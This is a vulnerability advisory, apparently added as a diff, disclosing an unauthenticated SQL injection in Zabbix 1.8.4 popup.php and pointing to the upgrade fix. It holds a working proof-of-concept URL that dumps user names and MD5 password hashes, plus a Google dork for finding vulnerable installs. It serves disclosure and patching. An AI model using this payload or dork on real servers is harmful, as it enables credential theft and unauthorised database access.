@@ -1,0 +1,103 @@
+# Exploit Title: Zabbix <= 1.8.4 SQL Injection
+# Google Dork: "Zabbix 1.8.4 Copyright 2001-2010 by SIA Zabbix"
+# Date: November 24th, 2011
+# Author: Marcio Almeida
+# Software Link:
+http://sourceforge.net/projects/zabbix/files/ZABBIX%20Latest%20Stable/1.8.4/zabbix-1.8.4.tar.gz/download
+# Version: <= 1.8.4
+# Tested on: Linux
+
+=============================================
+- Release date: November 24th, 2011
+- Discovered by: Marcio Almeida
+- Severity: High
+=============================================
+- Google Dork: "Zabbix 1.8.4 Copyright 2001-2010 by SIA Zabbix"
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Zabbix <= 1.8.4 SQL Injection
+
+II. BACKGROUND
+-------------------------
+Zabbix is an enterprise-class open source distributed monitoring solution.
+Zabbix is software that monitors numerous parameters of a network and the
+health and integrity of servers. Properly configured, Zabbix can play an
+important role in monitoring IT infrastructure. This is equally true for
+small organisations with a few servers and for large companies with a
+multitude of servers.
+
+III. INTRODUCTION
+-------------------------
+Zabbix version 1.8.3 and 1.8.4 has one vulnerability in the popup.php that
+enables an attacker to perform a SQL Injection Attack. No authentication
+required.
+
+IV. VULNERABLE CODE
+-------------------------
+
+File popup.php line 1513:
+
+
+$sql = 'SELECT DISTINCT hostid,host '.
+    ' FROM hosts'.
+    ' WHERE '.DBin_node('hostid', $nodeid).
+    ' AND status IN
+('.HOST_STATUS_PROXY_ACTIVE.','.HOST_STATUS_PROXY_PASSIVE.')'.
+    ' ORDER BY host,hostid';
+$result = DBselect($sql);
+
+
+V. PROOF OF CONCEPT
+-------------------------
+
+Below is a PoC request that retrieves all logins and MD5 password hashes of
+zabbix in MySQL Database:
+
+http://localhost/zabbix/popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=-1))%20union%20select%201,group_concat(surname,0x2f,passwd)%20from%20users%23
+
+
+VI. BUSINESS IMPACT
+-------------------------
+An attacker could exploit the vulnerability to retrieve any data from
+databases accessible by zabbix db user.
+In case zabbix has been given a more privileged mysql account the
+exploitation could go as far as code execution.
+
+An important remark regards the fact that the version 1.8.4 of zabbix
+web software is the current version installed by the apt-get command
+in debian linux distros.
+
+VII. SYSTEMS AFFECTED
+-------------------------
+Versions 1.8.3 and 1.8.4 are vulnerable.
+
+VIII. SOLUTION
+-------------------------
+Upgrade to version 1.8.9 that has just come out.
+
+IX. REFERENCES
+-------------------------
+http://www.zabbix.com
+https://support.zabbix.com/browse/ZBX-4385
+http://www.securityfocus.com/bid/50803/info
+
+X. CREDITS
+-------------------------
+The vulnerability has been discovered by Marcio Almeida
+marcio (at) alligatorteam (dot) org
+@marcioalm
+www.alligatorteam.org
+
+XI. ACKNOWLEDGEMENTS
+-------------------------
+To Heyder Andrade for development of Vulture.
+To the Alligator Security Team.
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this
+information.
